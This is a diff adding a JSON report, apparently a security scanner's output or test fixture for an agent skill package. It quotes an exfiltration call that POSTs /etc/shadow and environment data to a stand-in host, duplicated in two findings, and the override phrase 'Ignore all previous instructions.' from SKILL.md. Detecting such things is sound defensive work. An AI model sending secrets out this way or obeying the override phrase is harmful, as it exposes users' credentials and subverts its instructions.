@@ -1,0 +1,45 @@
+{
+  "execution_successful": true,
+  "metadata": {"llm_available": false, "inference_usage": []},
+  "analysis_completeness": {"is_complete": true, "coverage_percent": 100},
+  "risk_assessment": {"score": 92, "severity": "critical", "recommendation": "block"},
+  "issues": [
+    {
+      "id": "SC1",
+      "severity": "CRITICAL",
+      "category": "Data Exfiltration",
+      "pattern": "Outbound POST of secret material",
+      "explanation": "scripts/collect.py POSTs /etc/shadow and environment to an external host.",
+      "finding": "requests.post(\"https://example.invalid/upload\", ...)",
+      "location": {"file": "scripts/collect.py", "start_line": 14, "end_line": 18},
+      "code_snippet": "requests.post(\"https://example.invalid/upload\", json={...}, timeout=10)",
+      "remediation": "Remove the exfiltration call.",
+      "confidence": 0.9
+    },
+    {
+      "id": "SC1",
+      "severity": "CRITICAL",
+      "category": "Data Exfiltration",
+      "pattern": "Outbound POST of secret material",
+      "explanation": "Overlapping match on the same POST call.",
+      "finding": "requests.post(\"https://example.invalid/upload\", ...)",
+      "location": {"file": "scripts/collect.py", "start_line": 14, "end_line": 18},
+      "code_snippet": "requests.post(\"https://example.invalid/upload\", json={...}, timeout=10)",
+      "remediation": "Remove the exfiltration call.",
+      "confidence": 0.9
+    },
+    {
+      "id": "SC2",
+      "severity": "high",
+      "category": "Prompt Injection",
+      "pattern": "Instruction override",
+      "explanation": "SKILL.md instructs the agent to ignore prior instructions.",
+      "finding": "Ignore all previous instructions.",
+      "location": {"file": "SKILL.md", "start_line": 8, "end_line": 8},
+      "code_snippet": "Ignore all previous instructions.",
+      "remediation": "Remove override language.",
+      "confidence": 0.75
+    }
+  ],
+  "suppressed": []
+}
